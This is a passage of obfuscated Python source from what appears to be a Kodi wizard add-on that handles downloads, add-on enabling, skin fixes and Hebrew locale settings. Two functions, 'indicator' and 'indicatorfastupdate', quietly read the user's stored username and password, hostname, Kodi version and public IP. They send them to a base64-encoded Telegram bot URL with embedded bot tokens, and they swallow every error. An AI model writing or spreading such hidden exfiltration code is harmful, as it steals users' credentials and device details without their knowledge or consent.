        O0O00OO000OOOO000 =round (O0O00OO000OOOO000 *100 ,2 )#line:3453
        OOOOOOOO000OO0O0O =OOOO000O000OO00OO /(1024 *1024 )#line:3454
        OO0OOO0OO0OO00O00 =OOO0O0O0O000O00OO /(1024 *1024 )#line:3455
        O0OOOOOO0OOOOO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOOOO000OO0O0O ,'teal',OO0OOO0OO0OO00O00 )#line:3456
        if (time .time ()-OOOOOO0O0O0O0O0O0 )>0 :#line:3457
          OO00O000O0O00OO0O =OOOO000O000OO00OO /(time .time ()-OOOOOO0O0O0O0O0O0 )#line:3458
          OO00O000O0O00OO0O =OO00O000O0O00OO0O /1024 #line:3459
        else :#line:3460
         OO00O000O0O00OO0O =0 #line:3461
        O000O0000O00O0O0O ='KB'#line:3462
        if OO00O000O0O00OO0O >=1024 :#line:3463
           OO00O000O0O00OO0O =OO00O000O0O00OO0O /1024 #line:3464
           O000O0000O00O0O0O ='MB'#line:3465
        if OO00O000O0O00OO0O >0 and not O0O00OO000OOOO000 ==100 :#line:3466
            O00OOO0O0O0O0OOOO =(OOO0O0O0O000O00OO -OOOO000O000OO00OO )/OO00O000O0O00OO0O #line:3467
        else :#line:3468
            O00OOO0O0O0O0OOOO =0 #line:3469
        OO00OO0OOOO0OOOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O000O0O00OO0O ,O000O0000O00O0O0O )#line:3470
        O0O000OO0OOOOOOOO .update (int (O0O00OO000OOOO000 ),"Downloading "+name ,O0OOOOOO0OOOOO000 ,OO00OO0OOOO0OOOOO )#line:3472
  OO00OOO00000O00OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3475
  OOO00O0O0O000OOOO .close ()#line:3477
  extract (O00O0OOO0000000OO ,OO00OOO00000O00OO ,O0O000OO0OOOOOOOO )#line:3479
  if os .path .exists (OO00OOO00000O00OO +'/scakemyer-script.quasar.burst'):#line:3480
    if os .path .exists (OO00OOO00000O00OO +'/script.quasar.burst'):#line:3481
     shutil .rmtree (OO00OOO00000O00OO +'/script.quasar.burst',ignore_errors =False )#line:3482
    os .rename (OO00OOO00000O00OO +'/scakemyer-script.quasar.burst',OO00OOO00000O00OO +'/script.quasar.burst')#line:3483
  if os .path .exists (OO00OOO00000O00OO +'/plugin.video.kmediatorrent-master'):#line:3485
    if os .path .exists (OO00OOO00000O00OO +'/plugin.video.kmediatorrent'):#line:3486
     shutil .rmtree (OO00OOO00000O00OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3487
    os .rename (OO00OOO00000O00OO +'/plugin.video.kmediatorrent-master',OO00OOO00000O00OO +'/plugin.video.kmediatorrent')#line:3488
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3489
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3490
  try :#line:3491
    os .remove (O00O0OOO0000000OO )#line:3492
  except :#line:3493
    pass #line:3494
  O0O000OO0OOOOOOOO .close ()#line:3495
def dis_or_enable_addon (OO00OO000O0OO0O0O ,OO0O0O00O0OO0O0O0 ,enable ="true"):#line:3496
    import json #line:3497
    OOO0O00OO00O0O00O ='"%s"'%OO00OO000O0OO0O0O #line:3498
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OO000O0OO0O0O )and enable =="true":#line:3499
        logging .warning ('already Enabled')#line:3500
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00OO000O0OO0O0O )#line:3501
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OO000O0OO0O0O )and enable =="false":#line:3502
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00OO000O0OO0O0O )#line:3503
    else :#line:3504
        OO0OOO0O0000OOO0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO0O00OO00O0O00O ,enable )#line:3505
        O0OOO000OOO0OO0OO =xbmc .executeJSONRPC (OO0OOO0O0000OOO0O )#line:3506
        OO0OO0OO00O00OOOO =json .loads (O0OOO000OOO0OO0OO )#line:3507
        if enable =="true":#line:3508
            xbmc .log ("### Enabled %s, response = %s"%(OO00OO000O0OO0O0O ,OO0OO0OO00O00OOOO ))#line:3509
        else :#line:3510
            xbmc .log ("### Disabled %s, response = %s"%(OO00OO000O0OO0O0O ,OO0OO0OO00O00OOOO ))#line:3511
    if OO0O0O00O0OO0O0O0 =='auto':#line:3512
     return True #line:3513
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3514
def chunk_report (OOO0000OOO00O0OOO ,O0O00O00OOO00OOOO ,OO00OO00O0OO0OOOO ):#line:3515
   O00OOO000O0OO0OOO =float (OOO0000OOO00O0OOO )/OO00OO00O0OO0OOOO #line:3516
   O00OOO000O0OO0OOO =round (O00OOO000O0OO0OOO *100 ,2 )#line:3517
   if OOO0000OOO00O0OOO >=OO00OO00O0OO0OOOO :#line:3519
      sys .stdout .write ('\n')#line:3520
def chunk_read (O00OO00OOOO000O0O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3522
   import time #line:3523
   O0O00000O00OO0OO0 =int (filesize )*1000000 #line:3524
   OOO0O00OOOOO000O0 =0 #line:3526
   O00000O00O0O000OO =time .time ()#line:3527
   O0OOO000OO00OOOO0 =0 #line:3528
   logging .warning ('Downloading')#line:3530
   with open (destination ,"wb")as O0000O0OO0O0O000O :#line:3531
    while 1 :#line:3532
      OO00O00O000000O0O =time .time ()-O00000O00O0O000OO #line:3533
      OOO0O000OO0O0OOO0 =int (O0OOO000OO00OOOO0 *chunk_size )#line:3534
      O0O00000OO0O00OO0 =O00OO00OOOO000O0O .read (chunk_size )#line:3535
      O0000O0OO0O0O000O .write (O0O00000OO0O00OO0 )#line:3536
      O0000O0OO0O0O000O .flush ()#line:3537
      OOO0O00OOOOO000O0 +=len (O0O00000OO0O00OO0 )#line:3538
      OO0O00OOOOOOOOO0O =float (OOO0O00OOOOO000O0 )/O0O00000O00OO0OO0 #line:3539
      OO0O00OOOOOOOOO0O =round (OO0O00OOOOOOOOO0O *100 ,2 )#line:3540
      if int (OO00O00O000000O0O )>0 :#line:3541
        O0000O0000OO0000O =int (OOO0O000OO0O0OOO0 /(1024 *OO00O00O000000O0O ))#line:3542
      else :#line:3543
         O0000O0000OO0000O =0 #line:3544
      if O0000O0000OO0000O >1024 and not OO0O00OOOOOOOOO0O ==100 :#line:3545
          O0OOO0O000O00OO0O =int (((O0O00000O00OO0OO0 -OOO0O000OO0O0OOO0 )/1024 )/(O0000O0000OO0000O ))#line:3546
      else :#line:3547
          O0OOO0O000O00OO0O =0 #line:3548
      if O0OOO0O000O00OO0O <0 :#line:3549
        O0OOO0O000O00OO0O =0 #line:3550
      dp .update (int (OO0O00OOOOOOOOO0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0O00OOOOOOOOO0O ,OOO0O000OO0O0OOO0 /(1024 *1024 ),O0O00000O00OO0OO0 /(1000 *1000 ),O0000O0000OO0000O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OOO0O000O00OO0O ,60 ))#line:3551
      if dp .iscanceled ():#line:3552
         dp .close ()#line:3553
         break #line:3554
      if not O0O00000OO0O00OO0 :#line:3555
         break #line:3556
      if report_hook :#line:3558
         report_hook (OOO0O00OOOOO000O0 ,chunk_size ,O0O00000O00OO0OO0 )#line:3559
      O0OOO000OO00OOOO0 +=1 #line:3560
   logging .warning ('END Downloading')#line:3561
   return OOO0O00OOOOO000O0 #line:3562
def googledrive_download (OO0OO0OO000OO00O0 ,O00O00O0O0OOO0O00 ,OO000000OOOOO0O00 ,OO0OOOO0O0O0OO0O0 ):#line:3564
    OO00O00OO0OOO0OOO =[]#line:3568
    O000OO0OO00O000OO =OO0OO0OO000OO00O0 .split ('=')#line:3569
    OO0OO0OO000OO00O0 =O000OO0OO00O000OO [len (O000OO0OO00O000OO )-1 ]#line:3570
    def O0O00O0OOOO0OO00O (OO00O000O00OOOOO0 ):#line:3572
        for OO00O00O0O0O0O000 in OO00O000O00OOOOO0 :#line:3574
            logging .warning ('cookie.name')#line:3575
            logging .warning (OO00O00O0O0O0O000 .name )#line:3576
            O0OO0OOO00OOO0O0O =OO00O00O0O0O0O000 .value #line:3577
            if 'download_warning'in OO00O00O0O0O0O000 .name :#line:3578
                logging .warning (OO00O00O0O0O0O000 .value )#line:3579
                logging .warning ('cookie.value')#line:3580
                return OO00O00O0O0O0O000 .value #line:3581
            return O0OO0OOO00OOO0O0O #line:3582
        return None #line:3584
    def O000OOOO0O000O0O0 (O0O00O00OO00OOOO0 ,OO000OOO00O0OOO00 ):#line:3586
        OO0OOO000O0O00O00 =32768 #line:3588
        O00O0OOOO00O0000O =time .time ()#line:3589
        with open (OO000OOO00O0OOO00 ,"wb")as O000000OOOO0O0OO0 :#line:3591
            OO0O000OO00O0OO0O =1 #line:3592
            OO00O0OOOOOO0O0OO =32768 #line:3593
            try :#line:3594
                O00O00OOOO0OOO0O0 =int (O0O00O00OO00OOOO0 .headers .get ('content-length'))#line:3595
                print ('file total size :',O00O00OOOO0OOO0O0 )#line:3596
            except TypeError :#line:3597
                print ('using dummy length !!!')#line:3598
                O00O00OOOO0OOO0O0 =int (OO0OOOO0O0O0OO0O0 )*1000000 #line:3599
            for OO00OOOO0O0OOO0O0 in O0O00O00OO00OOOO0 .iter_content (OO0OOO000O0O00O00 ):#line:3600
                if OO00OOOO0O0OOO0O0 :#line:3601
                    O000000OOOO0O0OO0 .write (OO00OOOO0O0OOO0O0 )#line:3602
                    O000000OOOO0O0OO0 .flush ()#line:3603
                    OO00O00OO0OO0O00O =time .time ()-O00O0OOOO00O0000O #line:3604
                    O0O00OOO0000OOOOO =int (OO0O000OO00O0OO0O *OO00O0OOOOOO0O0OO )#line:3605
                    if OO00O00OO0OO0O00O ==0 :#line:3606
                        OO00O00OO0OO0O00O =0.1 #line:3607
                    OO0OOOO0O00OO0O00 =int (O0O00OOO0000OOOOO /(1024 *OO00O00OO0OO0O00O ))#line:3608
                    OOO000O0000OOOO00 =int (OO0O000OO00O0OO0O *OO00O0OOOOOO0O0OO *100 /O00O00OOOO0OOO0O0 )#line:3609
                    if OO0OOOO0O00OO0O00 >1024 and not OOO000O0000OOOO00 ==100 :#line:3610
                      OO0OOO0OOOO00OOOO =int (((O00O00OOOO0OOO0O0 -O0O00OOO0000OOOOO )/1024 )/(OO0OOOO0O00OO0O00 ))#line:3611
                    else :#line:3612
                      OO0OOO0OOOO00OOOO =0 #line:3613
                    OO000000OOOOO0O00 .update (int (OOO000O0000OOOO00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO000O0000OOOO00 ,O0O00OOO0000OOOOO /(1024 *1024 ),O00O00OOOO0OOO0O0 /(1000 *1000 ),OO0OOOO0O00OO0O00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0OOO0OOOO00OOOO ,60 ))#line:3615
                    OO0O000OO00O0OO0O +=1 #line:3616
                    if OO000000OOOOO0O00 .iscanceled ():#line:3617
                     OO000000OOOOO0O00 .close ()#line:3618
                     break #line:3619
    OO0O0O0000000O0O0 ="https://docs.google.com/uc?export=download"#line:3620
    import urllib2 #line:3625
    import cookielib #line:3626
    from cookielib import CookieJar #line:3628
    O00O0O0O0O0OO000O =CookieJar ()#line:3630
    O0O0OO0O0000OO00O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O00O0O0O0O0OO000O ))#line:3631
    O00000OOO0OO0OOOO ={'id':OO0OO0OO000OO00O0 }#line:3633
    O0O0OO0O0000O00O0 =urllib .urlencode (O00000OOO0OO0OOOO )#line:3634
    logging .warning (OO0O0O0000000O0O0 +'&'+O0O0OO0O0000O00O0 )#line:3635
    O000O00O0O0OOOO00 =O0O0OO0O0000OO00O .open (OO0O0O0000000O0O0 +'&'+O0O0OO0O0000O00O0 )#line:3636
    O0OO00O000O0OOO0O =O000O00O0O0OOOO00 .read ()#line:3637
    for OOO000OO0O000OO00 in O00O0O0O0O0OO000O :#line:3639
         logging .warning (OOO000OO0O000OO00 )#line:3640
    OOOO0O0OO0O00O00O =O0O00O0OOOO0OO00O (O00O0O0O0O0OO000O )#line:3641
    logging .warning (OOOO0O0OO0O00O00O )#line:3642
    if OOOO0O0OO0O00O00O :#line:3643
        O0OO00O0OOO0O0O00 ={'id':OO0OO0OO000OO00O0 ,'confirm':OOOO0O0OO0O00O00O }#line:3644
        O0000O0O0O0OOO0OO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3645
        O0O0OO0O0000O00O0 =urllib .urlencode (O0OO00O0OOO0O0O00 )#line:3646
        O000O00O0O0OOOO00 =O0O0OO0O0000OO00O .open (OO0O0O0000000O0O0 +'&'+O0O0OO0O0000O00O0 )#line:3647
        chunk_read (O000O00O0O0OOOO00 ,report_hook =chunk_report ,dp =OO000000OOOOO0O00 ,destination =O00O00O0O0OOO0O00 ,filesize =OO0OOOO0O0O0OO0O0 )#line:3648
    return (OO00O00OO0OOO0OOO )#line:3652
def kodi17Fix ():#line:3653
	OOO0O000OO0O00000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3654
	O00O0OOO00O0OO000 =[]#line:3655
	for O00O00O00OO00OO00 in sorted (OOO0O000OO0O00000 ,key =lambda O0O0O0000OO0O0O00 :O0O0O0000OO0O0O00 ):#line:3656
		OO0OO0OOOOO0OOO0O =os .path .join (O00O00O00OO00OO00 ,'addon.xml')#line:3657
		if os .path .exists (OO0OO0OOOOO0OOO0O ):#line:3658
			O0O0O000O0O00000O =O00O00O00OO00OO00 .replace (ADDONS ,'')[1 :-1 ]#line:3659
			OO000OOOOOO0OOO00 =open (OO0OO0OOOOO0OOO0O )#line:3660
			O0OOOO00OOOO0000O =OO000OOOOOO0OOO00 .read ()#line:3661
			O00O0OO00OOO0000O =parseDOM (O0OOOO00OOOO0000O ,'addon',ret ='id')#line:3662
			OO000OOOOOO0OOO00 .close ()#line:3663
			try :#line:3664
				O00OOO000O0OO00O0 =xbmcaddon .Addon (id =O00O0OO00OOO0000O [0 ])#line:3665
			except :#line:3666
				try :#line:3667
					log ("%s was disabled"%O00O0OO00OOO0000O [0 ],xbmc .LOGDEBUG )#line:3668
					O00O0OOO00O0OO000 .append (O00O0OO00OOO0000O [0 ])#line:3669
				except :#line:3670
					try :#line:3671
						log ("%s was disabled"%O0O0O000O0O00000O ,xbmc .LOGDEBUG )#line:3672
						O00O0OOO00O0OO000 .append (O0O0O000O0O00000O )#line:3673
					except :#line:3674
						if len (O00O0OO00OOO0000O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0O0O000O0O00000O ,xbmc .LOGERROR )#line:3675
						else :log ("Unabled to enable: %s"%O00O00O00OO00OO00 ,xbmc .LOGERROR )#line:3676
	if len (O00O0OOO00O0OO000 )>0 :#line:3677
		O0OOOO000O00O000O =0 #line:3678
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3679
		for O0OOOO00O00OOOO00 in O00O0OOO00O0OO000 :#line:3680
			O0OOOO000O00O000O +=1 #line:3681
			OO000O0O0O0O00000 =int (percentage (O0OOOO000O00O000O ,len (O00O0OOO00O0OO000 )))#line:3682
			DP .update (OO000O0O0O0O00000 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO00O00OOOO00 ))#line:3683
			addonDatabase (O0OOOO00O00OOOO00 ,1 )#line:3684
			if DP .iscanceled ():break #line:3685
		if DP .iscanceled ():#line:3686
			DP .close ()#line:3687
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3688
			sys .exit ()#line:3689
		DP .close ()#line:3690
	forceUpdate ()#line:3691
def indicator ():#line:3693
       try :#line:3694
          import json #line:3695
          wiz .log ('FRESH MESSAGE')#line:3696
          O0O0OO0O00OOOO0OO =(ADDON .getSetting ("user"))#line:3697
          OO0OOOOO00OO0O0O0 =(ADDON .getSetting ("pass"))#line:3698
          OO0O0OOOOO000O000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3699
          OOO00000OO00OO00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3700
          O0OO00OOOO00OO00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3701
          OOOOOO00000OO0OOO =str (json .loads (O0OO00OOOO00OO00O )['ip'])#line:3702
          OOOOOOOOOOOOOO0OO =O0O0OO0O00OOOO0OO #line:3703
          OO0O0OOO000OO0OOO =OO0OOOOO00OO0O0O0 #line:3704
          import socket #line:3705
          O0OO00OOOO00OO00O =urllib2 .urlopen (OOO00000OO00OO00O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOOOOOOOOOOOO0OO +' - '+OO0O0OOO000OO0OOO +' - '+OO0O0OOOOO000O000 +' - '+OOOOOO00000OO0OOO ).readlines ()#line:3706
       except :pass #line:3708
def indicatorfastupdate ():#line:3710
       try :#line:3711
          import json #line:3712
          wiz .log ('FRESH MESSAGE')#line:3713
          OOOOOO000OOOOOOO0 =(ADDON .getSetting ("user"))#line:3714
          OO00OOO000OO0OOO0 =(ADDON .getSetting ("pass"))#line:3715
          OO0OOOO000O00O00O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3716
          O000OOO000O0000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3718
          OO0OOOOO00O0000O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3719
          O0OO0000OOO0O000O =str (json .loads (OO0OOOOO00O0000O0 )['ip'])#line:3720
          OO000O000OO00OO0O =OOOOOO000OOOOOOO0 #line:3721
          O00OOOO0000OOOO0O =OO00OOO000OO0OOO0 #line:3722
          import socket #line:3724
          OO0OOOOO00O0000O0 =urllib2 .urlopen (O000OOO000O0000OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO000O000OO00OO0O +' - '+O00OOOO0000OOOO0O +' - '+OO0OOOO000O00O00O +' - '+O0OO0000OOO0O000O ).readlines ()#line:3725
       except :pass #line:3727
def skinfix18 ():#line:3729
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3730
		O0OO0OOO000OOOOO0 =wiz .workingURL (SKINID18DDONXML )#line:3731
		if O0OO0OOO000OOOOO0 ==True :#line:3732
			O00O0O0OOOO000OOO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3733
			if len (O00O0O0OOOO000OOO )>0 :#line:3734
				OOOO00O0OO0000000 ='%s-%s.zip'%(SKINID18 ,O00O0O0OOOO000OOO [0 ])#line:3735
				O00O00O0O00O0OOO0 =wiz .workingURL (SKIN18ZIPURL +OOOO00O0OO0000000 )#line:3736
				if O00O00O0O00O0OOO0 ==True :#line:3737
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3738
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3739
					O0OO000OO00OO00OO =os .path .join (PACKAGES ,OOOO00O0OO0000000 )#line:3740
					try :os .remove (O0OO000OO00OO00OO )#line:3741
					except :pass #line:3742
					downloader .download (SKIN18ZIPURL +OOOO00O0OO0000000 ,O0OO000OO00OO00OO ,DP )#line:3743
					extract .all (O0OO000OO00OO00OO ,HOME ,DP )#line:3744
					try :#line:3745
						OOOOOO0OOOOO00O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3746
						OO0OOO0O0OO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3747
						os .rename (OOOOOO0OOOOO00O00 ,OO0OOO0O0OO0OOOOO )#line:3748
					except :#line:3749
						pass #line:3750
					try :#line:3751
						OO00O00OOO0O000OO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O00000O0OO0OO0O0O =OO00O00OOO0O000OO .read ();OO00O00OOO0O000OO .close ()#line:3752
						OO0OO0O0OOO0OO0O0 =wiz .parseDOM (O00000O0OO0OO0O0O ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3753
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0O0OOO0OO0O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3754
					except :#line:3755
						pass #line:3756
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3757
					DP .close ()#line:3758
					xbmc .sleep (500 )#line:3759
					wiz .forceUpdate (True )#line:3760
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3761
				else :#line:3762
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3763
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00O00O0O00O0OOO0 ,xbmc .LOGERROR )#line:3764
			else :#line:3765
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3766
		else :#line:3767
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3768
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3769
def skinfix17 ():#line:3770
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3771
		OOOO000000OO00000 =wiz .workingURL (SKINID17DDONXML )#line:3772
		if OOOO000000OO00000 ==True :#line:3773
			O0O0O00O000OOOO0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3774
			if len (O0O0O00O000OOOO0O )>0 :#line:3775
				O000OO00O00OO0000 ='%s-%s.zip'%(SKINID17 ,O0O0O00O000OOOO0O [0 ])#line:3776
				O0O00OO0O00000000 =wiz .workingURL (SKIN17ZIPURL +O000OO00O00OO0000 )#line:3777
				if O0O00OO0O00000000 ==True :#line:3778
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3779
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3780
					O00OOO00O0O0O00O0 =os .path .join (PACKAGES ,O000OO00O00OO0000 )#line:3781
					try :os .remove (O00OOO00O0O0O00O0 )#line:3782
					except :pass #line:3783
					downloader .download (SKIN17ZIPURL +O000OO00O00OO0000 ,O00OOO00O0O0O00O0 ,DP )#line:3784
					extract .all (O00OOO00O0O0O00O0 ,HOME ,DP )#line:3785
					try :#line:3786
						O00OOO00000O000OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3787
						O0O0OO0OO00OO00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3788
						os .rename (O00OOO00000O000OO ,O0O0OO0OO00OO00O0 )#line:3789
					except :#line:3790
						pass #line:3791
					try :#line:3792
						OOOOO00000000OOOO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0OOO000OO0OOO0O =OOOOO00000000OOOO .read ();OOOOO00000000OOOO .close ()#line:3793
						O0OOOOO0OOOOOOO0O =wiz .parseDOM (OO0OOO000OO0OOO0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3794
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOO0OOOOOOO0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3795
					except :#line:3796
						pass #line:3797
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3798
					DP .close ()#line:3799
					xbmc .sleep (500 )#line:3800
					wiz .forceUpdate (True )#line:3801
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3802
				else :#line:3803
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3804
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O00OO0O00000000 ,xbmc .LOGERROR )#line:3805
			else :#line:3806
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3807
		else :#line:3808
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3809
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3810
def fix17update ():#line:3811
	if KODIV >=17 and KODIV <18 :#line:3812
		wiz .kodi17Fix ()#line:3813
		xbmc .sleep (4000 )#line:3814
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3815
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3816
		fixfont ()#line:3817
		OO00O0OO00OO00O00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3818
		try :#line:3820
			O0O00OO00OO000000 =open (OO00O0OO00OO00O00 ,'r')#line:3821
			O000000OOO00000O0 =O0O00OO00OO000000 .read ()#line:3822
			O0O00OO00OO000000 .close ()#line:3823
			OO0000O0O00OO0000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3824
			OOOOO0O0OOOO000OO =re .compile (OO0000O0O00OO0000 ).findall (O000000OOO00000O0 )[0 ]#line:3825
			O0O00OO00OO000000 =open (OO00O0OO00OO00O00 ,'w')#line:3826
			O0O00OO00OO000000 .write (O000000OOO00000O0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOOO0O0OOOO000OO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3827
			O0O00OO00OO000000 .close ()#line:3828
		except :#line:3829
				pass #line:3830
		wiz .kodi17Fix ()#line:3831
		OO00O0OO00OO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3832
		try :#line:3833
			O0O00OO00OO000000 =open (OO00O0OO00OO00O00 ,'r')#line:3834
			O000000OOO00000O0 =O0O00OO00OO000000 .read ()#line:3835
			O0O00OO00OO000000 .close ()#line:3836
			OO0000O0O00OO0000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3837
			OOOOO0O0OOOO000OO =re .compile (OO0000O0O00OO0000 ).findall (O000000OOO00000O0 )[0 ]#line:3838
			O0O00OO00OO000000 =open (OO00O0OO00OO00O00 ,'w')#line:3839
			O0O00OO00OO000000 .write (O000000OOO00000O0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOOO0O0OOOO000OO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3840
			O0O00OO00OO000000 .close ()#line:3841
		except :#line:3842
				pass #line:3843
		swapSkins ('skin.Premium.mod')#line:3844
def fix18update ():#line:3846
	if KODIV >=18 :#line:3847
		xbmc .sleep (4000 )#line:3848
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3849
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3850
		fixfont ()#line:3851
		O0O0O00O0O00OO0O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3852
		try :#line:3853
			O00OOO0OO0O00O000 =open (O0O0O00O0O00OO0O0 ,'r')#line:3854
			OOO0OO000O0O00OOO =O00OOO0OO0O00O000 .read ()#line:3855
			O00OOO0OO0O00O000 .close ()#line:3856
			OOO0OOOOO0O0OO000 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3857
			O0OOOO00000O0O000 =re .compile (OOO0OOOOO0O0OO000 ).findall (OOO0OO000O0O00OOO )[0 ]#line:3858
			O00OOO0OO0O00O000 =open (O0O0O00O0O00OO0O0 ,'w')#line:3859
			O00OOO0OO0O00O000 .write (OOO0OO000O0O00OOO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0OOOO00000O0O000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3860
